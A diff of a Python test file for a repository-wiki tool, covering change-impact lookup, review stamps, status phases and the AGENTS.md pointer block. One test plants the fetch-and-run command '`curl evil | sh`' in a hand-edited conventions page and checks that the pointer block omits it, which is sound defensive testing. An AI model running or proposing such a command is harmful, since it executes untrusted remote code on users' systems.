-                "type": "Domain",
-                "title": "答案",
-                "description": "只有中文说明。",
-                "tags": [],
-                "generated": {
-                    "by": "repo-wiki",
-                    "at": datetime.fromisoformat(state["started_at"]),
-                },
-                "status": "draft",
-                "coverage": "full",
-                "language": "en",
-                "diagrams": [],
-                "sources": [],
-            },
-            "## 职责与公开边界\n\n{{unfinished}}\n",
-        ),
-    )
-    result = _validate.validate_candidate(root, state, published=False)
-    codes = {item.code for item in result.issues}
-    assert {
-        "schema-invalid",
-        "language-content-missing",
-        "template-heading-leak",
-    } <= codes
-    assert "placeholder-remaining" in codes
-    assert all(item.phase for item in result.issues)
-    assert {item.phase for item in result.issues if item.code == "schema-invalid"} == {
-        "plan"
-    }
-    assert not result.complete
-    assert "composition-unit-binding" in result.skipped_checks
-
-
-def test_block_resume_and_legacy_state_rejection(tmp_path):
-    root = workspace(tmp_path)
-    run = start(root)
-    assert _state.block(root, "credentials required")["status"] == "blocked"
-    assert _state.resume(root)["status"] == "active"
-    path = run / "state.json"
-    state = json.loads(path.read_text(encoding="utf-8"))
-    state["contract"] = "artifact-loop-routing-closure"
-    write(path, json.dumps(state))
-    with pytest.raises(_state.StateError, match="single-author-plan-evidence-registry"):
-        _state.read(root)
-
-
-def test_skill_digest_ignores_runtime_cache_files():
-    cache = pathlib.Path(_state.__file__).parent / "__pycache__" / "digest-noise.pyc"
-    before = _state._skill_bundle_digest()
-    cache.parent.mkdir(exist_ok=True)
-    cache.write_bytes(b"not a runtime source")
-    try:
-        assert _state._skill_bundle_digest() == before
-    finally:
-        cache.unlink()
-
-
-def test_legacy_embedded_catalog_tables_are_rejected(tmp_path):
-    root = workspace(tmp_path)
-    run = start(root)
-    path = run / "state.json"
-    state = json.loads(path.read_text(encoding="utf-8"))
-    state["catalogs"] = [
-        {
-            "name": "database",
-            "content_hash": "a" * 64,
-            "storage_key": "database-aaaaaaaaaaaaaaaa",
-            "tables": [],
-        }
-    ]
-    write(path, json.dumps(state))
-
-    with pytest.raises(_state.StateError, match="thin Catalog pointers"):
-        _state.read(root)
-
-
-def test_thin_catalog_state_validates_grouped_table_coverage(tmp_path, monkeypatch):
-    root = workspace(tmp_path)
-    _workspace.add_opengauss_source(
-        root, "database", "DATABASE_URL", "public", ["orders", "orders_tmp"]
-    )
-    monkeypatch.setenv("DATABASE_URL", "opengauss://localhost/app")
-    capture = _db.capture_catalog
-
-    def capture_fake(capture_root, source):
-        tables = [
-            {
-                "schema": "public",
-                "name": name,
-                "comment": "",
-                "relation_kind": "table",
-                "persistence": "permanent",
-                "columns": [],
-                "constraints": [],
-                "primary_key": [],
-                "foreign_keys": [],
-                "indexes": [],
-                "partitions": [],
-            }
-            for name in source.tables
-        ]
-        return capture(
-            capture_root,
-            source,
-            inspect=lambda *_args: (
-                {"opengauss_version": "3.0.0", "database": "app"},
-                tables,
-            ),
-        )
-
-    monkeypatch.setattr(_db, "capture_catalog", capture_fake)
-    _state.start_run(root)
-    run = _state.run_dir(root, _state.read(root)["run_id"])
-    state = _state.read(root)
-    broken = plan_meta()
-    broken["catalog_groups"] = [
-        {"source": "database", "role": "working", "tables": ["orders"]}
-    ]
-    broken["units"][0]["participants"][0]["evidence"] = ["src/missing.py#L1-L2"]
-    write_plan(run, broken)
-
-    inspection = _state.plan_inspect(root)
-
-    assert {item["code"] for item in inspection["diagnostics"]} >= {
-        "catalog-table-unclassified",
-        "evidence-unresolved",
-        "source-area-coverage-invalid",
-    }
-    assert inspection["skipped_checks"] == [
-        "derived-unit-validation",
-        "ledger-output-budget",
-        "narrative-rendering",
-    ]
-
-    value = plan_meta()
-    value["source_areas"].append(
-        {
-            "id": "database.catalog",
-            "source": "database",
-            "paths": ["."],
-            "disposition": "shared",
-            "domain_ids": [],
-        }
-    )
-    value["catalog_groups"] = [
-        {
-            "source": "database",
-            "domain_id": "answers",
-            "role": "entity",
-            "tables": ["orders"],
-            "concept_ids": ["answer"],
-        },
-        {"source": "database", "role": "working", "tables": ["orders_tmp"]},
-    ]
-    value["concepts"][0]["model_basis"] = {
-        "basis": "opengauss",
-    }
-    path = run / "work/plan.md"
-    write_plan(run, value)
-
-    plan_value, issues = _validate.validate_plan_artifact(root, state, path)
-
-    assert plan_value is not None
-    assert not issues
-    model_unit = next(
-        unit for unit in plan_value.effective_units if unit.id == "model.answer"
-    )
-    assert model_unit.evidence_seeds == ["database/orders"]
-    assert model_unit.scopes[0].model_dump() == {
-        "source": "database",
-        "roles": ["model"],
-        "paths": ["orders"],
-    }
-    assert set(state["catalogs"][0]) == {"name", "content_hash", "storage_key"}
-
-
-def test_run_abandon(tmp_path):
-    root = workspace(tmp_path)
-    start(root)
-    assert _state.abandon(root) == {"abandoned": True}
-    assert _state.status(root)["status"] == "abandoned"
-
-
-def test_source_registration_variants(tmp_path):
-    root = tmp_path / "workspace"
-    origin = tmp_path / "origin"
-    files = tmp_path / "contracts"
-    origin.mkdir()
-    files.mkdir()
-    write(files / "schema.txt", "answer: integer\n")
-    subprocess.run(["git", "init", "-q", str(origin)], check=True)
-    subprocess.run(
-        ["git", "-C", str(origin), "config", "user.email", "qa@example.test"],
-        check=True,
-    )
-    subprocess.run(["git", "-C", str(origin), "config", "user.name", "QA"], check=True)
-    write(origin / "app.py", "answer = 42\n")
-    subprocess.run(["git", "-C", str(origin), "add", "app.py"], check=True)
-    subprocess.run(["git", "-C", str(origin), "commit", "-qm", "initial"], check=True)
-
-    _workspace.init(root)
-    assert _workspace.add_git_clone(root, str(origin), "service").kind == "git"
-    assert _workspace.add_files_source(root, str(files), "contracts").kind == "files"
-    database = _workspace.add_opengauss_source(
-        root, "database", "DATABASE_URL", "public", ["orders"]
-    )
-    assert database.kind == "opengauss"
-    assert database.tables == ("orders",)
-
-
-def test_directory_digest_is_order_independent_and_content_bound(tmp_path):
-    left = tmp_path / "left"
-    right = tmp_path / "right"
-    write(left / "b.txt", "B")
-    write(left / "a.txt", "A")
-    write(right / "a.txt", "A")
-    write(right / "b.txt", "B")
-
-    assert directory_digest(left) == directory_digest(right)
-    write(right / "b.txt", "changed")
-    assert directory_digest(left) != directory_digest(right)
-
-
-def test_active_run_state_is_read_as_utf8(tmp_path, monkeypatch):
-    root = workspace(tmp_path, "zh")
-    start(root)
-    original = pathlib.Path.read_text
-
-    def require_utf8(path, *args, **kwargs):
-        if path.name == "state.json":
-            assert kwargs.get("encoding") == "utf-8"
-        return original(path, *args, **kwargs)
-
-    monkeypatch.setattr(pathlib.Path, "read_text", require_utf8)
-    assert _workspace._active_run(root)
-
-
-def test_prune_uses_manifest_publication_order(tmp_path):
-    root = tmp_path / "workspace"
-    generations = root / ".okf-wiki/publication/generations"
-    for name, published_at, mtime in (
-        ("old", "2026-01-01T00:00:00+00:00", 3),
-        ("middle", "2026-01-02T00:00:00+00:00", 2),
-        ("new", "2026-01-03T00:00:00+00:00", 1),
-    ):
-        generation = generations / name
-        write(
-            generation / ".okf-manifest.json",
-            json.dumps({"published_at": published_at, "run_id": f"run-{name}"}),
-        )
-        os.utime(generation, (mtime, mtime))
-
-    assert _publish.prune(root, keep=1) == {"kept": ["new"]}
-
-
-def test_proposal_issues_are_sorted_by_path(tmp_path, monkeypatch):
-    proposals = tmp_path / "proposals"
-    write(proposals / "agents-block-b.md", "invalid\n")
-    write(proposals / "agents-block-a.md", "invalid\n")
-    state = {
-        "revisions": [
-            {"name": "a", "kind": "git"},
-            {"name": "b", "kind": "git"},
-        ]
-    }
-    unordered = [proposals / "agents-block-b.md", proposals / "agents-block-a.md"]
-    monkeypatch.setattr(pathlib.Path, "glob", lambda _path, _pattern: iter(unordered))
-
-    issues = _validate.validate_proposals(tmp_path, state, proposals)
-
-    assert [pathlib.Path(item.path).name for item in issues] == [
-        "agents-block-a.md",
-        "agents-block-b.md",
-    ]
+def test_update_compares_whole_reason_lines(tmp_path):
+    # "scope-modified src/a" is a substring of the existing "scope-modified
+    # src/a.py"; update must still record it before rebasing the draft.
+    from helpers import git_repo, wiki_ws
+
+    root = git_repo(tmp_path / "r", {"src/a": "a\n", "src/a.py": "b\n"})
+    ws = wiki_ws(root)
+    page = _page.new_page(ws, "modules/a.md", "Module", "Read.", ["src/**"])
+    set_body(ws, page.path, "<!-- okf:todo\n- scope-modified src/a.py\n-->\n\nBody.\n")
+    commit(root, {}, "draft")
+    draft = page.revision["."]  # wiki-only commits keep it current
+    commit(root, {"src/a": "changed\n"})
+    assert _impact.update(ws)["drafted"] == ["modules/a.md"]
+    lines = _page.load_page(ws, "modules/a.md").todos[0][1].split("\n")
+    # Each source change names the revision it was diffed from.
+    assert lines == ["- scope-modified src/a.py", f"- scope-modified src/a (since {draft[:12]})"]
+    # Nothing new on a second run: the existing whole line is recognized.
+    assert _impact.update(ws)["drafted"] == []
+
+
+def test_update_does_not_repeat_a_reason_line_with_the_same_base(tmp_path):
+    root, ws = _stable(tmp_path)
+    base = _page.load_page(ws, "modules/billing.md").revision["."]
+    commit(root, {"src/billing/retry.py": "MAX = 7\n"})
+    line = f"- scope-modified src/billing/retry.py (since {base[:12]})"
+    page = _page.load_page(ws, "modules/billing.md")
+    page.meta["status"] = "draft"
+    page.meta["revision"] = {".": base}  # the draft still predates the change
+    page.body = f"<!-- okf:todo\n{line}\n-->\n\n" + page.body
+    _page.write_page(page)
+    commit(root, {}, "wiki")
+    _impact.update(ws)
+    todo = _page.load_page(ws, "modules/billing.md").todos[0][1]
+    assert todo.split("\n").count(line) == 1
+
+
+@pytest.mark.parametrize("key, value", [
+    ("revision", None),  # set to HEAD below
+    ("scope", ["src/**"]),
+    ("description", "Edited description."),
+    ("title", "Edited"),
+    ("type", "Workflow"),
+    ("tags", ["edited"]),
+    ("catalogs", {"db/x.md": "0" * 64}),
+])
+def test_stable_frontmatter_edit_is_an_unreviewed_edit(tmp_path, key, value):
+    root, ws = _stable(tmp_path)
+    head = commit(root, {"src/billing/retry.py": "MAX = 4\n"})
+    assert "modules/billing.md" in {p["page"] for p in _impact.impact(ws)["pages"]}
+    page = _page.load_page(ws, "modules/billing.md")
+    page.meta[key] = {".": head} if key == "revision" else value
+    _page.write_page(page)
+    errors = [(i.code, i.page) for i in _validate.validate(ws) if i.severity == "error"]
+    assert ("unreviewed-edit", "modules/billing.md") in errors
+    with pytest.raises(_stamp.StampError, match="matching its stamp"):
+        _stamp.verify(ws, "human:alice", ["modules/billing.md"])
+
+
+def test_verify_and_status_edits_keep_the_stamp(tmp_path):
+    _, ws = _stable(tmp_path)
+    _stamp.verify(ws, "human:alice", ["modules/billing.md"])
+    page = _page.load_page(ws, "modules/billing.md")
+    assert page.meta["stamp"] == {"content_sha256": page.content_sha256(), "reviewed_by": None}
+    assert "unreviewed-edit" not in {i.code for i in _validate.validate(ws)}
+
+
+@pytest.mark.parametrize("newline", [b"\r\n", b"\r"])
+def test_crlf_checkout_keeps_stamps_and_review_digest(tmp_path, newline):
+    # A Windows autocrlf checkout must not turn stable pages into unreviewed edits
+    # or change the review subject of drafts.
+    _, ws = complete(tmp_path)
+    before = _review.subject(ws, _page.load_pages(ws))["subject_digest"]
+    draft = _page.load_page(ws, "modules/billing.md")
+    file = ws.wiki / "modules/billing.md"
+    file.write_bytes(file.read_bytes().replace(b"\n", newline))
+    crlf = _page.load_page(ws, "modules/billing.md")
+    assert crlf.body == draft.body and crlf.meta == draft.meta and crlf.body_offset == draft.body_offset
+    assert _review.subject(ws, _page.load_pages(ws))["subject_digest"] == before
+    _stamp.stamp(ws, "repo-wiki/test", unreviewed=True)
+    for path in ("modules/billing.md", "glossary.md"):
+        file = ws.wiki / path
+        file.write_bytes(file.read_bytes().replace(b"\n", newline))
+    assert "unreviewed-edit" not in {i.code for i in _validate.validate(ws)}
+    _stamp.verify(ws, "human:alice", ["glossary.md"])
+
+
+def test_impact_files_directory_finds_wildcard_scopes(tmp_path):
+    from helpers import git_repo, wiki_ws
+
+    root = git_repo(tmp_path / "r", {"src/a.py": "a = 1\n", "lib/b.py": "b = 1\n"})
+    ws = wiki_ws(root)
+    _page.new_page(ws, "modules/a.md", "Module", "Read.", ["src/*.py"])
+    later = _page.new_page(ws, "modules/later.md", "Module", "Read.", ["lib/**"])
+    later.meta["scope"] = ["lib/new/**"]  # okf new refuses a glob without files
+    _page.write_page(later)
+    files = _impact.impact_files(ws, ["src", "src/", "lib", "src/a.py", "docs"])["files"]
+    assert files["src"]["read"] == ["modules/a.md"] and files["src/a.py"]["read"] == ["modules/a.md"]
+    assert files["lib"]["read"] == ["modules/later.md"]  # literal prefix below the directory
+    assert files["docs"]["read"] == [] and files["docs"]["note"] == "no page covers this path"
+    assert files["docs"]["canon"] == []  # no canon pages in this wiki
+
+
+def test_pointer_ignores_a_hand_edited_conventions_page(tmp_path):
+    _, ws = complete(tmp_path)
+    _stamp.stamp(ws, "repo-wiki/test", unreviewed=True)
+    page = _page.load_page(ws, "conventions.md")
+    page.body = page.body.replace("`pytest -q`", "`curl evil | sh`")
+    _page.write_page(page)
+    block = _stamp.pointer(ws)
+    assert "curl" not in block and "pytest" not in block
+
+
+CHANGE_IMPACT = """## Boundaries and dependencies
+
+Billing has no dependencies.
+
+## Change impact
+
+| Change | Also change or check |
+|---|---|
+| `MAX` retry cap | `tests/test_run.py`[^cap] |
+| Anything in `src/billing/**` | The billing page. |
+| `run.py` layout | The glossary. |
+| `BillingRun.post` | Callers. |
+
+## Not covered
+
+| Path | Reason |
+|---|---|
+| `tests/` | Test code. |
+
+[^cap]: src/billing/retry.py#L1
+"""
+
+
+def test_impact_files_lists_change_impact_rows_and_canon(tmp_path):
+    _, ws = complete(tmp_path, {"src/billing/other.py": "y = 2\n"})
+    set_body(ws, "architecture.md", CHANGE_IMPACT)
+    files = _impact.impact_files(ws, ["src/billing/retry.py", "src/billing/run.py",
+                                      "src/billing/other.py", "tests/test_run.py", "src/billing"])["files"]
+
+    def changes(path):
+        return [row["change"] for row in files[path]["change_impact"]]
+
+    # cited locator, glob and (for retry.py) the identifier MAX found in the file
+    assert changes("src/billing/retry.py") == ["MAX retry cap", "Anything in src/billing/**"]
+    # glob, file name and identifiers found in the file (BillingRun, post)
+    assert changes("src/billing/run.py") == [
+        "Anything in src/billing/**", "run.py layout", "BillingRun.post"]
+    assert changes("src/billing/other.py") == ["Anything in src/billing/**"]
+    # an Also cell mentioning the path does not make the row about changing it
+    assert changes("tests/test_run.py") == []
+    assert files["tests/test_run.py"]["note"] == "not covered: Test code."
+    assert changes("src/billing") == ["MAX retry cap", "Anything in src/billing/**"]
+    row = files["src/billing/retry.py"]["change_impact"][0]
+    assert row == {"page": "architecture.md", "line": row["line"], "change": "MAX retry cap",
+                   "also": "tests/test_run.py"}
+    lines = (ws.wiki / "architecture.md").read_text(encoding="utf-8").split("\n")
+    assert lines[row["line"] - 1].startswith("| `MAX` retry cap |")
+    assert files["src/billing/retry.py"]["canon"] == ["glossary.md", "conventions.md"]
+
+
+def test_impact_files_in_a_hub_resolves_unprefixed_paths(tmp_path):
+    _, api, _, ws = _hub(tmp_path)
+    commit(api, {"src/only.py": "z = 1\n"})
+    _page.new_page(ws, "modules/api.md", "Module", "Read before api.", ["api/src/**"])
+    files = _impact.impact_files(ws, ["src/only.py", "src", "api/src/a.py", "nowhere.py"])["files"]
+    assert files["api/src/only.py"]["read"] == ["modules/api.md"]
+    assert files["api/src/only.py"]["note"] == "resolved src/only.py to api/src/only.py (only source api has it)"
+    assert files["src"]["note"] == "ambiguous: sources api, web all have src; prefix it with the source name"
+    assert files["api/src/a.py"]["note"] is None
+    assert files["nowhere.py"]["note"] == "no page covers this path"
+
+
+def test_cli_impact_files_from_inside_a_hub_source(tmp_path, capsys, monkeypatch):
+    import okf
+
+    _, api, web, ws = _hub(tmp_path)
+    _page.new_page(ws, "modules/api.md", "Module", "Read before api.", ["api/src/**"])
+    monkeypatch.chdir(api)
+    assert okf.main(["impact", "--files", "src/a.py", "--json"]) == 0
+    files = json.loads(capsys.readouterr().out)["files"]
+    assert files["api/src/a.py"]["read"] == ["modules/api.md"]
+    monkeypatch.chdir(api / "src")
+    assert okf.main(["impact", "--files", "a.py", str(web / "src/b.py"), "--json"]) == 0
+    files = json.loads(capsys.readouterr().out)["files"]
+    assert set(files) == {"api/src/a.py", "web/src/b.py"}
+    # Read-only status walks up to the hub; commands that write still refuse.
+    monkeypatch.chdir(api)
+    assert okf.main(["status", "--json"]) == 0
+    status = json.loads(capsys.readouterr().out)
+    assert status["phase"] == "discover" and status["root"] == str(ws.root)
+    assert okf.main(["update", "--json"]) == 2
+    assert "run okf from" in json.loads(capsys.readouterr().out)["error"]
+
+
+ISSUE = {"page": "modules/billing.md", "kind": "missing", "claim": "c", "fix": "f"}
+
+
+def test_unreviewed_stamp_is_refused_while_changes_are_requested(tmp_path):
+    root, ws = complete(tmp_path)
+    approve(ws, issues=[ISSUE, ISSUE | {"kind": "parrot"}])
+    for _ in ("current", "stale"):
+        result = _stamp.stamp(ws, "repo-wiki/test", unreviewed=True)
+        assert result["stamped"] == []
+        [issue] = [i for i in result["blocked"] if i["code"] == "review"]
+        assert "requests changes (2 issues)" in issue["message"]
+        assert "fresh review round" in issue["fix"] and "delete _review.json" in issue["fix"]
+        status = _status.status(root)
+        assert status["phase"] == "review"
+        assert not any("--unreviewed" in a for a in status["next_actions"])
+        set_body(ws, "modules/billing.md", BILLING + "\nRepaired.\n")  # the report goes stale
+    (ws.wiki / _review.REVIEW_FILE).unlink()  # resolved with the user
+    assert any("--unreviewed" in a for a in _status.status(root)["next_actions"])
+    assert _stamp.stamp(ws, "repo-wiki/test", unreviewed=True)["stamped"]
+
+
+def test_stamp_lists_remaining_warnings_with_file_lines(tmp_path, capsys, monkeypatch):
+    import okf
+
+    root, ws = complete(tmp_path)
+    set_body(ws, "modules/billing.md", BILLING + "\nIt retries because gateways time out.\n")
+    commit(root, {}, "wiki")
+    monkeypatch.chdir(root)
+    assert okf.main(["stamp", "--by", "repo-wiki/test", "--unreviewed", "--json"]) == 0
+    result = json.loads(capsys.readouterr().out)
+    [warning] = [w for w in result["warnings"] if w["code"] == "uncited-why"]
+    lines = (ws.wiki / "modules/billing.md").read_text(encoding="utf-8").split("\n")
+    assert warning["page"] == "modules/billing.md" and "because" in lines[warning["line"] - 1]
+    assert result["verified_by"] is None and result["index_changed"] is True
+    # The human summary shows each warning as page:line.
+    commit(root, {}, "stamped")
+    assert okf.main(["stamp", "--by", "repo-wiki/test"]) == 0
+    out = capsys.readouterr().out
+    assert f"warning[uncited-why] modules/billing.md:{warning['line']}:" in out
+
+
+def test_status_discover_until_briefs_exist(tmp_path):
+    import _config
+    from helpers import git_repo
+
+    root = git_repo(tmp_path / "r", {"src/a.py": "x = 1\n", "lib/b.py": "y = 1\n"})
+    _config.init(root)
+    commit(root, {}, "wiki")
+    ws = _config.load(root)
+    _page.new_page(ws, "modules/a.md", "Module", "Read before a.", ["src/**"])
+    _page.new_page(ws, "modules/b.md", "Module", "Read before b.", ["lib/**"])
+    set_body(ws, "modules/a.md", "<!-- okf:todo\nBrief\n-->\n\n## Responsibility and boundaries\n")
+    status = _status.status(root)
+    # One stub still has no brief and the canon briefs are empty.
+    assert status["phase"] == "discover" and "modules/b.md" in status["next_actions"][0]
+    assert "modules/a.md" not in status["next_actions"][0]
+    # A canon brief ends discovery even while a stub is empty.
+    set_body(ws, "glossary.md", "<!-- okf:todo\nTerm: x\n-->\n\n" + _page.template("en", "Glossary").split("-->\n", 1)[1])
+    assert _status.status(root)["phase"] != "discover"
+
+
+def test_status_done_says_nothing_to_do_when_the_wiki_is_committed(tmp_path):
+    root, ws = _stable(tmp_path)
+    status = _status.status(root)
+    assert status["phase"] == "done" and status["next_actions"] == ["nothing to do: the wiki is committed and current"]
+    assert all(i["severity"] == "warning" for i in status["issues"])
+    (ws.wiki / "notes.txt").write_text("x\n", encoding="utf-8")  # untracked counts too
+    action = _status.status(root)["next_actions"][0]
+    assert action.startswith("review and commit the wiki (1 changed files)")
+
+
+def test_status_issues_match_counts_in_every_phase(tmp_path):
+    root, ws = complete(tmp_path)
+    set_body(ws, "modules/billing.md", BILLING + "\nIt retries because gateways time out.\n")
+    status = _status.status(root)
+    assert status["phase"] == "review" and status["counts"]["warnings"] == 1
+    assert [i["code"] for i in status["issues"]] == ["uncited-why"]
+
+
+def test_pointer_block_content_and_limit(tmp_path):
+    import re
+
+    _, ws = complete(tmp_path)
+    rows = "".join(f"| Task {n} | `make t{n}`[^test] | verified |\n" for n in range(12))
+    conventions = _page.load_page(ws, "conventions.md").body
+    set_body(ws, "conventions.md", conventions.replace("| verified |\n", "| verified |\n" + rows, 1))
+    assert _stamp.stamp(ws, "repo-wiki/test", unreviewed=True)["blocked"] == []
+    block = _stamp.pointer(ws)
+    lines = block.splitlines()
+    assert len(lines) == 15 and lines[0] == _stamp.POINTER_BEGIN and lines[-1] == _stamp.POINTER_END
+    assert "okf impact --files <paths> --json" in block
+    assert "docs/wiki/glossary.md" in block and "docs/wiki/conventions.md" in block
+    assert "Verified commands:" in block and "- Tests: `pytest -q`" in block
+    assert "hub" not in block
+    # The invariant command prints whole invariant tables (header and rows).
+    command = next(line for line in lines if line.startswith("`rg -nU"))
+    pattern = command.split("'")[1]
+    page = (ws.wiki / "modules/billing.md").read_text(encoding="utf-8")
+    found = re.search(pattern, page, re.MULTILINE)
+    assert found and "A posted invoice is never posted again." in found.group(0)
+
+
+def test_pointer_in_a_hub_asks_to_paste_it_into_each_source(tmp_path):
+    _, _, _, ws = _hub(tmp_path)
+    block = _stamp.pointer(ws)
+    assert "each source's AGENTS.md" in block and "never writes into sources" in block
+    assert len(block.splitlines()) <= 15
